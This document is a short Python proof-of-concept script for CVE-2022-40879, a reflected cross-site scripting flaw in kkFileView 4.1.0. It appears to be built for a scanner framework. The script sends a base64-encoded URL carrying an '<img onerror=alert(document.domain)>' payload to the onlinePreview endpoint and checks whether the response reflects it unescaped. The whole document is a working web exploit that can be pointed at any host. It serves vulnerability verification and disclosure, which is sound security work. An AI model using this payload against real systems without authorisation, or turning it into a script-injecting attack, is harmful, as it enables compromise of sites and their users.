# title: kkFileView 4.1.0 - Cross-Site Scripting CVE-2022-40879
# author: antx
# cveid: CVE-2022-40879

from poctools import BasicPoc


class APoc(BasicPoc):

    def __init__(self):
        super(APoc, self).__init__()
        self.name = 'A-Poc'

    def verify(self, url: str):
        url = url.rstrip("/")
        target = f'{url}/onlinePreview?url=aHR0cHM6Ly93d3cuZ29vZ2xlLjxpbWcgc3JjPTEgb25lcnJvcj1hbGVydChkb2N1bWVudC5kb21haW4pPj1QUQ=='
        try:
            resp = self.get(target)
            if resp.status_code == 200 and 'text/html' in str(resp.headers) and '<img src=1 onerror=alert(document.domain)>=PQ</p>' in resp.text and '该文件不' in resp.text:
                return True
        except Exception as e:
            pass
        return False


if __name__ == '__main__':
    target = 'http://127.0.0.1'
    tp = APoc()
    result = tp.run(url=target)
    print(f'{target} -> {result}')
